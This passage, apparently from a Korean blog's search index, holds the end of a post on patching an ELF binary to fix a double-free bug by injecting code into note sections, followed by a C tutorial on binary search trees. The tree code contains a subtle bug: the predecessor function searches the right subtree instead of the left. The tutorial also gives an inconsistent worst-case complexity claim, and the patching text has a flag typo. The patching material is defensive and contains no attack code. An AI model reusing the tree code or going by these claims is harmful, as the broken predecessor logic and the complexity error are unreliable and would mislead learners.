않기 때문에 문제가 없습니다. 추가할 코드 길이도 단축할 겸 조건문은 생략하겠습니다.\nvoid__libc_free (void *mem)&#123;  mstate ar_ptr;  mchunkptr p;                          /* chunk corresponding to mem */  if (mem == 0)                              /* free(0) has no effect */    return;  // ...\n패치를 위해 main 함수에서 delete 메뉴를 처리하는 부분을 살펴보겠습니다. main+366 에서 s[i] 의 값을 레지스터 rax 에 대입한 후, main+374 에서 레지스터 rdi 로 옮겨 main+377 에서 호출하는 delete_data 함수의 인자가 되도록 하고 있습니다. 패치에는 여러 방법이 있겠으나, 여기서는 main+366 에서 새로 삽입한 코드를 호출하여 s[i] 의 초기화와 free 함수 호출을 처리하도록 하겠습니다. 호출 이후 main+382 의 분기까지는 nop 로 덮어 기존의 인스트럭션을 무시하도록 합니다.\npwndbg&gt; disass mainDump of assembler code for function main:...   0x000000000000161c &lt;+342&gt;:   call   0x11a0 &lt;__isoc99_scanf@plt&gt;   0x0000000000001621 &lt;+347&gt;:   mov    eax,DWORD PTR [rbp-0x9c]   0x0000000000001627 &lt;+353&gt;:   cmp    eax,0xf   0x000000000000162a &lt;+356&gt;:   ja     0x1649 &lt;main+387&gt;   0x000000000000162c &lt;+358&gt;:   mov    eax,DWORD PTR [rbp-0x9c]   0x0000000000001632 &lt;+364&gt;:   mov    eax,eax   0x0000000000001634 &lt;+366&gt;:   mov    rax,QWORD PTR [rbp+rax*8-0x90]   0x000000000000163c &lt;+374&gt;:   mov    rdi,rax   0x000000000000163f &lt;+377&gt;:   call   0x1450 &lt;delete_data&gt;   0x0000000000001644 &lt;+382&gt;:   jmp    0x16f4 &lt;main+558&gt;\n새로운 코드를 삽입하기 전 먼저 섹션 헤더와 세그먼트 헤더를 수정하여 코드를 삽입할 공간이 실행 가능한 영역으로 로드되도록 해야 합니다. 섹션 헤더와 세그먼트 헤더를 수정하기 위해서는 바이너리의 섹션 헤더 테이블과 프로그램 헤더 테이블에서 해당하는 부분을 직접 고쳐야 합니다. 상용 프로그램인 010 Editor의 템플릿 기능을 사용하는 방법이 가장 빠르긴 하나, 바이너리를 파싱하여 편집할 수 있도록 도와주는 무료 웹페이지를 사용하는 방법도 못지 않게 간편합니다.\nelfy.io | ELF viewer and editor OnlineELF viewer and editor\n페이지 좌상단의 Open 버튼을 클릭하여 바이너리를 업로드한 후, 왼쪽의 Section headers 메뉴를 클릭하면 섹션 헤더들이 나열됩니다. 이들 중 Elf_Shdr3 , Elf_Shdr4 섹션 헤더가 코드를 삽입할 .note.gnu.build-id , .note.ABI-tag 섹션에 해당합니다. 각각의 필드를 클릭하면 아래와 같이 페이지 우측에 헥스 에디터와 같은 인터페이스가 표시됩니다.\n\n인터페이스의 edit 버튼을 클릭하여 바이트 단위로 편집하고, commit 버튼을 클릭하면 바이너리에 반영할 수 있습니다. 이전 문단의 그림과 같이 .note.gnu.build-id , .note.ABI-tag 섹션 헤더의 sh_type 과 sh_flags 필드를 각각 SHT_PROGBITS , SHF_ALLOC | SHF_EXECINSTR 로 변경합니다. 변경해야 할 값은 섹션 헤더와 프로그램 헤더를 소개한 문단에서 /usr/include/elf.h 파일에 정의된 내용을 참고하면 됩니다.\n동일한 방법으로 Elf_Phdr8 프로그램 헤더의 p_type 필드와 p_flags 필드를 PT_LOAD , PF_R | PX_X 로 변경합니다. 변경을 마친 후 페이지 좌상단의 Save 버튼을 클릭하면 수정사항이 반영된 바이너리를 내려받을 수 있습니다. readelf로 섹션과 세그먼트를 조사해 보면 잘 변경되었음을 확인할 수 있습니다.\n$ readelf --sections --wide .\\main.patched.1There are 31 section headers, starting at offset 0x3978:Section Headers:  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0  [ 1] .interp           PROGBITS        0000000000000318 000318 00001c 00   A  0   0  1  [ 2] .note.gnu.property NOTE            0000000000000338 000338 000030 00   A  0   0  8  [ 3] .note.gnu.build-id PROGBITS        0000000000000368 000368 000024 00  AX  0   0  4  [ 4] .note.ABI-tag     PROGBITS        000000000000038c 00038c 000020 00  AX  0   0  4...$ readelf --segments --wide .\\main.patched.1Elf file type is DYN (Shared object file)Entry point 0x11c0There are 13 program headers, starting at offset 64Program Headers:  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align  PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x0002d8 0x0002d8 R   0x8  INTERP         0x000318 0x0000000000000318 0x0000000000000318 0x00001c 0x00001c R   0x1      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]  LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000950 0x000950 R   0x1000  LOAD           0x001000 0x0000000000001000 0x0000000000001000 0x000709 0x000709 R E 0x1000  LOAD           0x002000 0x0000000000002000 0x0000000000002000 0x000238 0x000238 R   0x1000  LOAD           0x002d60 0x0000000000003d60 0x0000000000003d60 0x0002b0 0x0002d0 RW  0x1000  DYNAMIC        0x002d70 0x0000000000003d70 0x0000000000003d70 0x0001f0 0x0001f0 RW  0x8  NOTE           0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8  LOAD           0x000368 0x0000000000000368 0x0000000000000368 0x000044 0x000044 R E 0x4\n다음으로 삽입할 코드를 작성해 보겠습니다. 삽입할 코드는 delete_data 함수를 대신하여 호출되며, 이 코드에서 수행해야 할 작업을 의사코드로 나타내면 다음과 같습니다.\nfree(s[i]);s[i] = NULL;\n따라서 다음과 같이 어셈블리 코드로 옮길 수 있습니다. call 인스트럭션은 이후 opcode로 옮길 때 인스트럭션의 위치와 free@plt 의 상대적인 오프셋을 인자로 전달해야 하므로, call 0xd86 이 되어야 함에 유의합니다.\nlea rax, qword ptr [rbp + rax*8 - 0x90]mov rdi, qword ptr [rax]mov qword ptr [rax], 0call free@pltret\n어셈블리 코드를 위에서 사용한 온라인 어셈블러 웹페이지에서 opcode로 옮긴 후, 헥스 에디터를 이용해 .note.gnu.build-id 섹션의 위치인 오프셋 0x368 에 덮어씁니다. 또한 main+366 부터 main+382 까지는 삽입한 코드를 호출하는 call 인스트럭션과 nop 인스트럭션으로 덮어씁니다. 패치된 바이너리를 디스어셈블하면 최종적으로 다음과 같아야 합니다.\npwndbg&gt; disass mainDump of assembler code for function main:...   0x000000000000161c &lt;+342&gt;:   call   0x11a0 &lt;__isoc99_scanf@plt&gt;   0x0000000000001621 &lt;+347&gt;:   mov    eax,DWORD PTR [rbp-0x9c]   0x0000000000001627 &lt;+353&gt;:   cmp    eax,0xf   0x000000000000162a &lt;+356&gt;:   ja     0x1649 &lt;main+387&gt;   0x000000000000162c &lt;+358&gt;:   mov    eax,DWORD PTR [rbp-0x9c]   0x0000000000001632 &lt;+364&gt;:   mov    eax,eax   0x0000000000001634 &lt;+366&gt;:   call   0x368   0x0000000000001639 &lt;+371&gt;:   nop   0x000000000000163a &lt;+372&gt;:   nop   0x000000000000163b &lt;+373&gt;:   nop   0x000000000000163c &lt;+374&gt;:   nop   0x000000000000163d &lt;+375&gt;:   nop   0x000000000000163e &lt;+376&gt;:   nop   0x000000000000163f &lt;+377&gt;:   nop   0x0000000000001640 &lt;+378&gt;:   nop   0x0000000000001641 &lt;+379&gt;:   nop   0x0000000000001642 &lt;+380&gt;:   nop   0x0000000000001643 &lt;+381&gt;:   nop   0x0000000000001644 &lt;+382&gt;:   jmp    0x16f4 &lt;main+558&gt;...pwndbg&gt; x/5i 0x368   0x368:       lea    rax,[rbp+rax*8-0x90]   0x370:       mov    rdi,QWORD PTR [rax]   0x373:       mov    QWORD PTR [rax],0x0   0x37a:       call   0x1100 &lt;free@plt&gt;   0x37f:       ret\n패치된 바이너리는 동일한 구조체를 연속으로 해제하려 시도하여도 동적 메모리 할당자에 의해 강제 종료되지 않습니다. 따라서 double free 버그로 인해 발생한 취약점이 잘 보완되었음을 확인할 수 있습니다.\n$ ./main.patched...&gt; 2index: 01. add data2. delete data3. show data4. exit&gt; 2index: 01. add data2. delete data3. show data4. exit&gt;\n결론\n바이너리 패치는 소스 코드가 없는 바이너리의 동작을 변형해야 하는 상황에서 유용합니다. 패치를 위해서는 디스어셈블러로 패치할 인스트럭션의 위치와 정확한 형태를 먼저 파악한 후, 헥스 에디터로 직접 편집하거나 코드를 삽입한 후 삽입된 코드를 호출하도록 해야 합니다. 코드 삽입에는 섹션 헤더와 프로그램 헤더를 수정하여 실행에 직접적으로 필요하지 않는 섹션을 사용하였으며, 바이너리의 취약점을 패치로 보완하는 실습을 통해 실제로 코드를 삽입하고 실행 흐름을 변형하는 것이 가능함을 확인하였습니다.\n참고문헌\n[1] D. Andriesse, “Chapter 2: The ELF Format,” in Practical Binary Analysis. San Francisco, CA: No Starch Press, 2019, pp. 31-55.\n[2] D. Andriesse, “Chapter 7: Simple Code Injection Techniques,” in Practical Binary Analysis. San Francisco, CA: No Starch Press, 2019, pp. 155-187.\n\n\n","categories":["Security","Reverse Engineering"]},{"title":"이진 탐색 트리","url":"/2022/06/08/binary-search-tree/","content":"\n    \n    유의사항\n    이 글은 Introduction to Algorithms 책의 내용을 학습 목적으로 정리하고 일부를 수정하거나 추가한 내용입니다.\n    \n\n개요\n이진 탐색 트리의 정의와 성질을 살펴보고 구현해 보겠습니다.\n이진 탐색 트리란\n정의와 성질\n이진 탐색 트리(binary search tree)는 이진 트리면서, 다음과 같은 재귀적인 성질을 가진 트리입니다.\n\n노드를 기준으로 왼쪽 트리에 있는 노드들은 더 작은 키(key)를 가진다. 오른쪽 트리에 있는 노드들은 더 큰 키를 가진다.\n\n성질에서 알 수 있듯, 이진 탐색  트리는 키-값(key-value)의 데이터를 저장하는 자료구조입니다. 이 글에서는 편의상 키와 값은 모두 정수이며, 두 값이 같아고 가정하겠습니다. 아래 그림의 두 트리는 모두 위의 성질을 만족하는 이진 탐색 트리입니다.\n\n이진 탐색 트리는 성질 상 탐색, 삽입, 삭제 등 연산의 시간 복잡도가 트리의 높이에 비례합니다. 따라서 같은 데이터를 저장하는 트리라도 형태에 따라 복잡도의 차이가 생길 수 있습니다. 그림에서 왼쪽의 경우 O(log⁡n)O(\\log n)O(logn)의 시간 복잡도를 갖지만, 오른쪽과 같이 비효율적인 경우 최악에는 O(n)O(n)O(n)의 복잡도를 갖게 됩니다.\n구조체와 함수 선언\n자료구조 구현은 모두 C언어로 하겠습니다. 트리의 노드에 해당하는 Node 구조체는 키와 값을 나타내는 key 와 value , 각각 왼쪽 자식, 오른쪽 자식, 부모 노드를 가리키는 포인터 left , right , parent 를 멤버로 가집니다. 이진 탐색 트리를 나타내는 BST 구조체는 루트 노드를 가리키는 포인터 root 를 멤버로 가집니다.\ntypedef struct Node &#123;\tint key, value;\tstruct Node *left, *right, *parent;&#125; Node; typedef struct BinarySearchTree &#123;\tNode *root;&#125; BST;\n이진 탐색 트리의 연산을 구현하기 위한 함수들은 다음과 같습니다.\n// 모든 노드를 키 순으로 출력합니다.void print(BST *bst); // 주어진 키를 가진 노드를 찾아 반환합니다.Node *search(BST *bst, int key); // 키 순으로 정렬했을 때 하나 작은 키를 가진 노드를 반환합니다.Node *prev(BST *bst, int key); // 키 순으로 정렬했을 때 하나 큰 키를 가진 노드를 반환합니다.Node *next(BST *bst, int key); // 새로운 노드를 삽입합니다.void insert(BST* bst, int key, int value); // 주어진 키를 가진 노드를 삭제합니다.void delete(BST *bst, int key);\n위의 함수들을 구현하기 위해 내부적으로 다음과 같은 내장 함수들을 사용합니다. 함수 이름 앞에 언더스코어(underscore) 두 개가 붙어 있으면 내장 함수로 구분하겠습니다. 이 함수들의 필요성과 쓰임에 대해서는 밑에서 하나씩 살펴볼 예정입니다.\n// 노드를 기준으로 중위 순회하며 키와 값을 출력합니다.void __tree_walk(Node *x); // 노드를 기준으로 하위 트리에서 주어진 키를 가진 노드를 찾아 반환합니다.Node *__tree_search(Node *x, int key); // 노드를 기준으로 왼쪽 트리에서 가장 작은 키를 가진 노드를 반환합니다.Node *__tree_min(Node *x); // 노드를 기준으로 오른쪽 트리에서 가장 큰 키를 가진 노드를 반환합니다.Node *__tree_max(Node *x); // 키 순으로 정렬했을 때 노드의 키보다 하나 작은 키를 가진 노드를 반환합니다.Node *__tree_predecessor(Node *x); // 키 순으로 정렬했을 때 노드의 키보다 하나 큰 키를 가진 노드를 반환합니다.Node *__tree_successor(Node *x); // 트리에서 노드 u의 위치에 노드 v를 대입합니다.void __transplant(BST *bst, Node *u, Node *v);\n이진 탐색 트리 구현\n트리 순회하기\n이제 제일 쉬운 함수부터 하나씩 구현해 봅시다. 가장 먼저 순회는 아주 쉬운데, 이진 트리를 중위 순회(in-order)해주면 됩니다. 이진 탐색 트리의 성질로 인해 키가 작은 노드부터 정렬된 순서로 순회하게 됩니다.\n\n순회를 위한 내장 함수 __tree_walk 는 재귀 호출을 이용해 구현합니다. 왼쪽 트리를 재귀적으로 순회하고, 자신의 키와 값을 출력하고, 다시 오른쪽 트리를 재귀적으로 순회하는 방식입니다. 트리의 출력을 위한 print 함수는 루트 노드를 기준으로 순회를 수행하면 됩니다.\n// 내장 함수void __tree_walk(Node *x) &#123;\tif (x != NULL) &#123;\t\t__tree_walk(x-&gt;left);\t\tprintf(&quot;%d %d\\n&quot;, x-&gt;key, x-&gt;value);\t\t__tree_walk(x-&gt;right);\t&#125;&#125; void print(BST *bst) &#123;\t__tree_walk(bst-&gt;root);&#125;\n키를 가진 노드 찾기\n다음은 탐색입니다. 탐색은 특정 키를 가진 노드를 찾는 연산으로, 사용하는 언어가 딕셔너리(dictionary), 맵(map), 연관 배열(associative array) 같은 이름의 자료구조를 지원한다면 숱하게 쓰는 연산입니다. 이진 탐색 트리는 이진 탐색을 통해 평균적으로 O(log⁡n)O(\\log n)O(logn) 시간에 특정 키를 가진 노드를 찾을 수 있습니다. 아래 그림은 이진 탐색을 통해 키 13 을 가진 노드를 찾는 과정을 나타내고 있습니다.\n\n탐색을 위한 내장 함수 __tree_search 는 노드 x 의 키와 주어진 key 를 반복하여 비교합니다. 주어진 key 가 더 크다면 x 의 오른쪽 자식을 x 에 대입하여 오른쪽 트리에서 반복을 계속합니다. key 가 더 작은 경우 왼쪽 트리에서 반복을 계속합니다. 반복문의 종료 조건으로 x 의 키와 key 가 일치하면 성공적으로 찾은 경우입니다. x 가 NULL 이 되는 경우는 주어진 key 를 찾지 못한 경우입니다.\n탐색 연산은 일반적인 이진 탐색과 매우 유사합니다. __tree_walk 와 같이 재귀적으로 구현할 수도 있으나, 반복적으로 구현하는 쪽이 함수 호출과 반환에 필요한 시간과 공간을 아낄 수 있습니다. 트리에서의 탐색 연산을 위한 __search 함수는 루트 노드를 기준으로 탐색을 수행하면 됩니다.\n// 내장 함수Node *__tree_search(Node *x, int key) &#123;\twhile (x != NULL &amp;&amp; x-&gt;key != key) &#123;\t\tx = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;\t&#125;\treturn x;&#125; Node *search(BST *bst, int key) &#123;\treturn __tree_search(bst-&gt;root, key);&#125;\n같은 원리로 가장 작은 키를 가진 노드를 반환하는 __tree_min, 가장 큰 키를 가진 노드를 반환하는 __tree_max 내장 함수도 구현할 수 있습니다. 이진 탐색 트리의 성질에 따라 왼쪽 자식만 따라가면 가장 작은 키, 오른쪽 자식만 따라가면 가장 큰 키가 나오게 됩니다.\nNode *__tree_search(Node *x, int key) &#123;\twhile (x != NULL &amp;&amp; x-&gt;key != key) &#123;\t\tx = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;\t&#125;\treturn x;&#125; Node *__tree_min(Node *x) &#123;\twhile (x-&gt;left != NULL) &#123;\t\tx = x-&gt;left;\t&#125;\treturn x;&#125;\n이전과 다음 노드 찾기\n이진 탐색 트리는 정렬된 자료구조입니다. 정렬된 자료구조에서는 특정 데이터의 이전 순서나 다음 순서의 데이터를 조회해야 하는 경우가 있습니다. 그런데 이진 탐색 트리의 성질을 활용하면, 이전 순서나 다음 순서를 찾기 위해 키를 서로 비교하지 않고도 이들 노드를 찾아낼 수 있습니다.\n먼저 다음 순서를 찾는 연산을 보겠습니다. 다음 순서를 찾을 때는 트리의 형태에 따라 그림과 같이 두 가지 경우가 존재합니다. 그림의 왼쪽은 3 의 다음 노드 4 를 찾는 과정으로, 3 의 오른쪽 자식이 존재하고 있습니다. 이진 탐색 트리의 성질에 따라, 오른쪽 자식이 존재하는 경우 오른쪽 트리에서 키가 최솟값인 노드를 찾으면 됩니다. 현재 노드보다 키가 큰 노드들 중에서 가장 작은 노드를 찾으면 그것이 다음 노드이기 때문입니다.\n\n그림의 오른쪽은 5 의 다음 노드가 6 을 찾고 있습니다. 그런데 5 는 오른쪽 자식 노드가 없습니다. 이런 경우에도 자기보다 키가 작은 노드는 왼쪽 트리, 큰 노드는 오른쪽 트리에 존재한다는 성질을 이용합니다. 기준 노드의 조상 노드들을 조회하면서 기준 노드를 왼쪽 트리의 노드로 갖는 첫 번째 조상을 찾으면, 키의 비교 없이도 다음 노드를 찾을 수 있습니다. 더욱 복잡한 이 경우도 최악의 시간 복잡도가 트리의 높이에 비례하므로, 다음 노드를 찾는 연산의 시간 복잡도는 O(log⁡n)O(\\log n)O(logn)입니다.\n노드를 기준으로 다음 노드를 찾는 내장 함수 __tree_successor 는 두 경우를 구분하기 위한 분기문이 존재합니다. 4행은 오른쪽 자식이 존재하는 경우로, __tree_min 함수를 이용해 오른쪽 트리에서 키가 최솟값인 노드를 찾아 반환합니다. 7행은 오른쪽 자식이 없는 경우로, 이 때는 두 노드의 관계를 비교하기 위해 기준 노드 x 의 부모를 가리키는 포인터 y 를 사용합니다. x 는 부모 노드를 가리키는 포인터를 계속 따라가면서, y 가 x 의 부모를 가리키도록 계속 갱신합니다. 처음으로 x 가 y 의 왼쪽 자식이 되는 순간, y 를 반환합니다.\n주어진 키에 대한 다음 노드를 반환하는 연산에 해당하는 next 함수는 앞서 구현한 내장 함수 __tree_search 를 이용해 주어진 키를 가진 노드를 찾습니다. 이후 해당 노드에 대해 내장 함수 __tree_successor 를 호출하여 다음 노드를 찾아 반환합니다.\n// 내장 함수Node *__tree_successor(Node *x) &#123;\tNode *y = x-&gt;parent; \tif (x-&gt;right != NULL) &#123;\t\treturn __tree_min(x-&gt;right);\t&#125;\twhile (y != NULL &amp;&amp; x == y-&gt;right) &#123;\t\tx = y;\t\ty = y-&gt;parent;\t&#125;\treturn y;&#125; Node *next(BST *bst, int key) &#123;\tNode *x = __tree_search(bst-&gt;root, key); \treturn __tree_successor(x);&#125;\n이전 순서를 찾을 때도 트리의 형태에 따라 두 가지 경우가 존재합니다. 다음 순서를 찾을 때와 똑같이 처리하면 됩니다. 왼쪽 자식이 있는 경우는 왼쪽 트리에서 최댓값을 반환합니다. 왼쪽 자식이 없는 경우, 조상 노드들을 조회하면서 기준 노드를 오른쪽 트리의 노드로 갖는 첫 번째 조상을 찾아야 합니다.\n\n이전 노드를 찾는 내장 함수 __tree_predecessor 와, 주어진 키에 대한 이전 노드를 찾는 함수 prev 는 다음 노드를 찾는 코드와 똑같은 원리로 구현하면 됩니다. 단, 사용하는 함수가 __tree_min 에서 __tree_max 로 바뀌는 등 방향만 바꿔줍니다.\n// 내장 함수Node *__tree_predecessor(Node *x) &#123;\tNode *y = x-&gt;parent; \tif (x-&gt;left != NULL) &#123;\t\treturn __tree_max(x-&gt;right);\t&#125;\twhile (y != NULL &amp;&amp; x == y-&gt;left) &#123;\t\tx = y;\t\ty = y-&gt;parent;\t&#125;\treturn y;&#125; Node *prev(BST *bst, int key) &#123;\tNode *x = __tree_search(bst-&gt;root, key); \treturn __tree_predecessor(x);&#125;\n트리에 노드 삽입하기\n새로운 노드를 이진 탐색 트리에 추가하는 연산은 삽입 연산입니다. 삽입 연산은 새로운 노드를 항상 리프 노드로 추가하면 쉽게 구현할 수 있습니다. 아래 그림은 이진 탐색 트리에 새로운 키 7 을 가진 노드를 삽입하는 과정을 나타내고 있습니다.\n\n노드를 삽입하기 위해서는, 이진 탐색을 통해 삽입할 노드를 자식으로 가질 노드를 찾아야 합니다. 삽입할 노드를 왼쪽 자식으로 가질 노드라면 기존에 왼쪽 자식이 없어야 하고, 오른쪽 자식으로 가질 노드라면 오른쪽 자식이 없어야 합니다. 그림에서는 이진 탐색을 통해 키 7 의 새로운 노드를 삽입할 노드를 찾습니다. 키 8 을 가진 노드가 왼쪽 자식이 없으면서, 7 은 8 보다 작으니 해당 노드의 왼쪽 자식으로 삽입하는 것입니다. 삽입 연산의 시간 복잡도 또한 트리의 높이에 비례하므로, O(log⁡n)O(\\log n)O(logn)입니다.\n삽입 연산을 구현한 insert 함수는 키와 값을 인자로 받고, malloc 함수를 통해 새로운 노드를 생성합니다. 이후 6행에서 루트 노드에서 시작하는 포인터 x 와, x 의 부모를 가리키는 포인터 y 를 이용하여 이진 탐색을 수행합니다. 반복문의 종료 조건은 y 의 자식 x 가 NULL 이 되는 것으로, 이때의 x 의 위치가 새로운 노드를 삽입해야 할 위치입니다. 12행에서는 주어진 키 값과 y 의 키 값을 비교하여, 왼쪽 자식으로 삽입할지 오른쪽 자식으로 삽입할지 결정합니다. 만약 이진 탐색 트리가 비어 있었다면 새로운 노드를 루트 노드로 설정합니다.\nvoid insert(BST* bst, int key, int value) &#123;\tNode *newnode = malloc(sizeof(Node));\tNode *x = bst-&gt;root, *y = NULL; \t*newnode = (Node) &#123; key, value, NULL, NULL, NULL &#125;;\twhile (x != NULL) &#123;\t\ty = x;\t\tx = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;\t&#125;\tnewnode-&gt;parent = y; \tif (y == NULL) &#123;\t// 이진 탐색 트리가 비어 있는 경우\t\tbst-&gt;root = newnode;\t&#125; else if (newnode-&gt;key &lt; y-&gt;key) &#123;\t\ty-&gt;left = newnode;\t&#125; else &#123;\t\ty-&gt;right = newnode;\t&#125;&#125;\n트리에서 노드 삭제하기\n트리에서 노드를 삭제하는 연산은 구현 중 다소 까다로운 부분입니다. 항상 새로운 노드를 리프 노드로 추가하는 삽입 연산과 달리, 노드를 중간에서 삭제하게 되면 트리의 형태가 변형되기 때문입니다. 노드를 삭제할 때는 삭제할 노드가 가진 자식의 개수에 따라 경우가 나누어집니다. 아래 그림은 트리에서 키 3 을 가진 노드를 삭제하는 모습으로, 삭제할 노드가 자식이 아예 없거나 하나인 경우입니다.\n\n그림의 경우는 비교적 단순한 경우로, 자식이 없는 경우는 단순히 삭제하면 됩니다. 자식이 하나 있는 경우는 해당 자식 노드를 삭제할 노드 위치에 대입하면, 이진 탐색 트리의 성질을 유지하면서 삭제를 수행할 수 있습니다. 사실 이 둘은 구현 상으로는 동일한 경우입니다. 자식이 없는 경우도 NULL 자식 노드가 있어 삭제할 위치에 NULL 을 대입한다고 생각하면 자식이 하나인 경우와 같은 코드로 처리할 수 있기 때문입니다.\n반면 자식이 두 개 있는 경우는 조금 복잡합니다. 이 때는 트리에서 순서 상 다음 노드를 찾은 후, 다음 노드가 삭제할 노드의 오른쪽 자식인지 아닌지에 따라 경우가 나뉘게 됩니다. 먼저 다음 노드가 오른쪽 자식인 경우는 다음 노드를 삭제할 노드 위치에 대입합니다. 이 때 이진 탐색 트리의 성질에 의해 다음 노드는 왼쪽 자식이 없습니다. 만약 왼쪽 자식이 있으면 그쪽이 다음 노드가 되어 모순이기 때문입니다. 따라서 삭제할 노드 위치에 대입하여도, 삭제할 노드의 왼쪽 자식을 그대로 왼쪽 자식으로 가질 수 있습니다.\n\n다음 노드가 삭제할 노드의 오른쪽 자식이 아닐 수도 있습니다. 이 때 삭제할 노드를 xxx, 삭제할 노드의 오른쪽 자식을 rrr, 삭제할 노드의 다음 노드를 yyy 라고 하겠습니다. 이 경우에는 트리를 두 번 움직여 주어야 합니다. 먼저 다음 노드 yyy의 오른쪽 자식을 yyy 위치에 대입합니다. 이후 yyy를 삭제할 노드 xxx 위치에 대입한 후, xxx의 오른쪽 자식 rrr과 연결해줍니다. 앞서 말했듯 다음 노드 yyy는 왼쪽 자식이 없어, 두 작업 모두 전혀 문제가 되지 않습니다.\n\n삭제 연산은 모든 경우에서 노드를 다른 노드의 위치에 대입하는 작업이 필요합니다. 따라서 먼저 대입을 위한 내장 함수 __transplant 를 구현하겠습니다. 이 함수는 노드 v 를 노드 u 위치에 대입한 후, 기존 노드 u 의 부모가 새로운 노드 v 를 자식으로 갖도록 합니다. 다만 새로운 노드 v 의 자식 포인터들을 연결하는 작업은 하지 않아, 함수를 호출한 쪽에서 직접 해야 합니다.\nvoid __transplant(BST *bst, Node *u, Node *v) &#123;\tif (u-&gt;parent == NULL) &#123;\t\t\t// u가 루트 노드인 경우\t\tbst-&gt;root = v;\t&#125; else if (u == u-&gt;parent-&gt;left) &#123;\t// u가 왼쪽 자식이었다면\t\tu-&gt;parent-&gt;left = v;\t&#125; else &#123;\t\t\t\t\t\t\t// u가 오른쪽 자식이었다면\t\tu-&gt;parent-&gt;right = v;\t&#125;\tif (v != NULL) &#123;\t\tv-&gt;parent = u-&gt;parent;\t&#125;&#125;\n이제 __transplant 함수를 이용해서 삭제 함수를 편하게 구현할 수 있습니다. 삭제 연산을 위한 delete 함수는 키 key 를 받아, 내장 함수 __tree_search 를 호출하여 삭제할 노드 x 를 찾고 삭제합니다. 4행과 6행은 삭제할 노드 x 의 자식이 없거나 하나인 경우로, __transplant 함수를 호출해 자식 또는 NULL 을 x 위치에 대입합니다.\n9행은 x 의 자식이 둘인 경우입니다. 이 경우는 먼저 x 의 오른쪽 트리에서 다음 노드 y 를 찾습니다. 11행은 y 가 x 의 오른쪽 자식이 아닌 경우로, 위의 그림과 같이 y 의 오른쪽 자식을 y 위치에 대입시켜 놓습니다. 이후 y 가 x 의 오른쪽 자식 (그림에서 rrr)의 부모가 되도록 연결합니다. 그러면 16행에서, 다음 노드가 x 의 오른쪽 자식인 경우와 똑같이 y 를 x 위치에 대입만 해주면 됩니다. 대입 후 y 의 자식에 대한 포인터 연결은 직접 해야 함에 유의합니다.\nvoid delete(BST *bst, int key) &#123;\tNode *x = __tree_search(bst-&gt;root, key), *y; \tif (x-&gt;left == NULL) &#123;\t\t__transplant(bst, x, x-&gt;right);\t&#125; else if (x-&gt;right == NULL) &#123;\t\t__transplant(bst, x, x-&gt;left);\t&#125; else &#123;\t\ty = __tree_min(x-&gt;right);\t\t\t\tif (y-&gt;parent != x) &#123;\t\t\t__transplant(bst, y, y-&gt;right);\t\t\ty-&gt;right = x-&gt;right;\t\t\ty-&gt;right-&gt;parent = y;\t\t&#125;\t\t__transplant(bst, x, y);\t\ty-&gt;left = x-&gt;left;\t\ty-&gt;left-&gt;parent = y;\t&#125;&#125;\n이진 탐색 트리 사용해보기\n이진 탐색 트리의 모든 연산을 구현했으니, 직접 사용해 봅시다. 아래는 BST 구조체를 사용하는 테스트 코드입니다. 5행은 이진 탐색 트리에 1부터 10까지의 키를 뒤죽박죽 삽입하고 출력합니다. 삽입은 그렇게 해도 출력은 작은 순서대로 잘 나와줍니다. 10행은 키 1~3을 삭제하고, 11~13을 새로 집어넣은 후 또 출력합니다. 이번에도 4부터 13까지 작은 순서대로 잘 출력됩니다.\nint main() &#123;\tint arr[10] = &#123; 5, 3, 9, 2, 6, 7, 4, 1, 10, 8 &#125;;\tBST bst = &#123; NULL &#125;; \tfor (int i = 0; i &lt; 10; i++) &#123;\t\tinsert(&amp;bst, arr[i], arr[i]);\t&#125;\tprint(&amp;bst); \tdelete(&amp;bst, 3);\tdelete(&amp;bst, 2);\tdelete(&amp;bst, 1);\tinsert(&amp;bst, 11, 11);\tinsert(&amp;bst, 12, 12);\tinsert(&amp;bst, 13, 13);\tprint(&amp;bst); \treturn 0;&#125;\n$ ./main 1 12 23 34 45 56 67 78 89 910 104 45 56 67 78 89 910 1011 1112 1213 13\n결론\n이진 탐색 트리는 키-값 데이터를 정렬된 순서로 관리할 수 있고, 삽입과 삭제 등의 모든 연산을 이상적으로는 O(log⁡n)O(\\log n)O(logn) 시간에 처리할 수 있습니다. 하지만 트리의 형태에 따라 최악의 경우 O(n)O(n)O(n) 시간까지 걸릴 수 있습니다. 이 경우에는 선형 자료구조에 비해 별로 좋은 점이 없습니다.\n따라서 집합이나 딕셔너리 등 컨테이너의 구현에는 트리의 형태를 효율적인 형태로 유지하도록 하는 알고리즘이 추가된 자가 균형(self-balancing) 이진 탐색 트리를 사용합니다. 실제로 리눅스의 g++ 컴파일러가 사용하는 C++ 라이브러리를 동적 분석한 결과, std::set 의 구현에 자가 균형 이진 탐색 트리의 일종인 레드-블랙 트리(red-black tree)를 사용하고 있었다고 합니다.\nWhat is the underlying data structure of a STL set in C++?I would like to know how a set is implemented in C++. If I were to implement my own set container without using the STL provided container, what would be the best way to go about this task?\n\nI unde...Stack Overflow\n참고자료\n[1] T.H. Corman, C.E. Leiserson, R.L. Rivest and C. Stein, “Binary Search Trees,” in Introduction to Algorithms, 3rd ed. Cambridge, MA: MIT Press, 2009, pp. 286-298.\n부록\n이진 탐색 트리 구현 코드\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; /* Definitions */ typedef struct Node &#123;\tint key, value;\tstruct Node *left, *right, *parent;&#125; Node; typedef struct BinarySearchTree &#123;\tNode *root;&#125; BST;  /* Internal Functions */ void __tree_walk(Node *x) &#123;\tif (x != NULL) &#123;\t\t__tree_walk(x-&gt;left);\t\tprintf(&quot;%d %d\\n&quot;, x-&gt;key, x-&gt;value);\t\t__tree_walk(x-&gt;right);\t&#125;&#125; Node *__tree_search(Node *x, int key) &#123;\twhile (x != NULL &amp;&amp; x-&gt;key != key) &#123;\t\tx = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;\t&#125;\treturn x;&#125; Node *__tree_min(Node *x) &#123;\twhile (x-&gt;left != NULL) &#123;\t\tx 